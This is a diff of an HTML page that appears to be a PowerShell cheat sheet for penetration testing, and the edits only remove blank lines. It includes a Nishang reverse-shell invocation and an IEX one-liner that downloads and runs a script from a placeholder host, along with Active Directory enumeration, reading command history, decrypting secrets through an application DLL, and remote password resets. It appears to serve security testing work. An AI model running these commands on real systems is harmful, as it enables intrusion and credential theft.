@@ -335,14 +335,12 @@
 $cred = New-Object System.Management.Automation.PSCredential(&quot;&lt;dom&gt;\&lt;username&gt;&quot;, $pass)
 Invoke-Command -Computer &lt;computer_name&gt; -Credential $cred -ScriptBlock { cmd.exe &quot;/c &lt;cmd&gt;&quot; }
 </code></pre>
-
 <h2 id="download-and-execute-script">Download and execute script</h2>
 <p>The repository <a href="https://github.com/samratashok/nishang" target="_blank">Nishang</a> contains a good
 PowerShell script to create a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">reverse shell</a>.
 You need to add the following line at the end:</p>
 <pre><code class="language-powershell">Invoke-PowerShellTcp -Reverse -IPAddress &lt;ip&gt; -Port &lt;port&gt;
 </code></pre>
-
 <p>On your local machine:</p>
 <ul>
 <li>Create an HTTP server to serve the script: <code>python -m http.serve</code></li>
@@ -351,7 +349,6 @@ You need to add the following line at the end:</p>
 <p>On the remote host, execute the following PowerShell script:</p>
 <pre><code class="language-powershell">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
 </code></pre>
-
 <h2 id="execute-c-dll-from-powershell">Execute C# DLL from Powershell</h2>
 <pre><code class="language-powershell"># Load a dll to Powershell
 [Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Service.dll&quot;)
@@ -364,7 +361,6 @@ You need to add the following line at the end:</p>
 $c = New-Object MyNamespace.Cryptography.MyCryptography
 $c.Decrypt(&quot;CIPHER_TEXT&quot;, [MyNamespace.Service.Config]::ApplicationKey())
 </code></pre>
-
 <h2 id="domain-commands">Domain commands</h2>
 <h3 id="collect-ad-users-information">Collect AD users information</h3>
 <p>Here is snippets of Powershell commands to interact with AD LDAP. You can also
@@ -404,21 +400,17 @@ function Get-ADComputerByOS($operatingSystem) {
 $DomainAdmins = Get-ADGroupMembers(&quot;Domain Admins&quot;)
 foreach($user in $DomainAdmins) { echo &quot;$($user.displayname) ($($user.samaccountname))&quot; }
 </code></pre>
-
 <h3 id="get-domain-password-policy">Get Domain Password Policy</h3>
 <pre><code class="language-powershell">$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
 </code></pre>
-
 <h3 id="get-user-owner">Get user owner</h3>
 <pre><code class="language-powershell">Get-ADUser $USERNAME | ForEach-Object {Get-ACL &quot;AD:\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner}
 </code></pre>
-
 <h3 id="list-deleted-users">List deleted users</h3>
 <pre><code class="language-powershell">$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
 $objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter &quot;(objectClass=user)&quot; -IncludeDeletedObjects -properties *
 foreach ($object in $objects) { $object }
 </code></pre>
-
 <h2 id="miscellaneous-commands">Miscellaneous commands</h2>
 <h3 id="list-tcp-listening-connections">List TCP listening connections</h3>
 <p>The <a href="https://docs.microsoft.com/en-us/powershell/module/nettcpip/get-nettcpconnection?view=win10-ps" target="_blank"><code>Get-NetTCPConnection</code></a>
@@ -426,27 +418,22 @@ cmdlets lists TCP connections. By default the processes pid is return, so the
 following command line select the process name instead.</p>
 <pre><code class="language-powershell">Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name=&quot;Process&quot;;Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table -AutoSize
 </code></pre>
-
 <h3 id="list-email-aliases">List Email aliases</h3>
 <pre><code class="language-powershell">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
 </code></pre>
-
 <h3 id="get-powershell-command-history">Get PowerShell command history</h3>
 <pre><code class="language-powershell">cd &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline&quot;
 gc ConsoleHost_history.txt
 </code></pre>
-
 <h3 id="convert-dacl">Convert DACL</h3>
 <pre><code class="language-powershell">$acl = get-acl HKLM:\System\CurrentControlSet\Services
 ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }
 </code></pre>
-
 <h3 id="set-password-remotely">Set Password Remotely</h3>
 <p>This <a href="../assets/Set-PasswordRemotely.ps1">script</a> change the password of a user
 on a remote forest.</p>
 <pre><code class="language-powershell">Set-PasswordRemotely {USERNAME} {DOMAIN}
 </code></pre>
-
 <h3 id="list-certificates">List Certificates</h3>
 <pre><code class="language-powershell">$NamingContext = &quot;DC=corpo,DC=lan&quot;
 
